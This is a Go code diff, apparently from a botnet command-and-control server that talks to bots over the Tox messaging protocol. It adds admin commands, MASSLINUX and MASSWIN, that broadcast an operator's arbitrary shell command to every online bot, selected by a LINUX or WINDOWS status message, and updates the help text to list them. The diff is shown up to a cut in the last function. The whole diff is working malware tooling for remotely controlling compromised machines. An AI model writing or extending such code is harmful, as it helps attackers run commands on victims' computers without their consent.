@@ -7,7 +7,7 @@ import (
 )
 
 func AdminHelp(senderNum uint32) {
-	help := "[+] HELP\n[?] LIST - List online bots.\n[?] EXEC <BOT> <CMD> - Execute command on bot.\n[?] MASS <CMD> - Mass execute command."
+	help := "[+] HELP\n[?] LIST - List online bots.\n[?] EXEC <BOT> <CMD> - Execute command on bot.\n[?] MASS <CMD> - Mass execute command.\n[?] MASSLINUX <CMD> - Mass execute command on Linux bots.\n[?] MASSWIN <CMD> - Mass execute command on Windows bots."
 	_, err := Tox_instance.FriendSendMessage(senderNum, help)
 	if err != nil {
 		fmt.Println(err)
@@ -68,6 +68,56 @@ func AdminMass(senderNum uint32, senderKey string, messages []string) {
 			fmt.Println(err)
 		}
 		if status != 0 {
+			_, err = Tox_instance.FriendSendMessage(fno, senderKey+" "+strings.Join(messages[1:], " "))
+			if err != nil {
+				fmt.Println(err)
+			}
+		}
+	}
+}
+
+func AdminMassLinux(senderNum uint32, senderKey string, messages []string) {
+	friends := Tox_instance.SelfGetFriendList()
+	for _, fno := range friends {
+		if fno == senderNum {
+			continue
+		}
+		status, err := Tox_instance.FriendGetConnectionStatus(fno)
+		if err != nil {
+			fmt.Println(err)
+		}
+
+		status_message, err := Tox_instance.FriendGetStatusMessage(fno)
+		if err != nil {
+			fmt.Println(err)
+		}
+
+		if status != 0 && status_message == "LINUX" {
+			_, err = Tox_instance.FriendSendMessage(fno, senderKey+" "+strings.Join(messages[1:], " "))
+			if err != nil {
+				fmt.Println(err)
+			}
+		}
+	}
+}
+
+func AdminMassWin(senderNum uint32, senderKey string, messages []string) {
+	friends := Tox_instance.SelfGetFriendList()
+	for _, fno := range friends {
+		if fno == senderNum {
+			continue
+		}
+		status, err := Tox_instance.FriendGetConnectionStatus(fno)
+		if err != nil {
+			fmt.Println(err)
+		}
+
+		status_message, err := Tox_instance.FriendGetStatusMessage(fno)
+		if err != nil {
+			fmt.Println(err)
+		}
+
+		if status != 0 && status_message == "WINDOWS" {
 			_, err = Tox_instance.FriendSendMessage(fno, senderKey+" "+strings.Join(messages[1:], " "))
 			if err != nil {
 				fmt.Println(err)
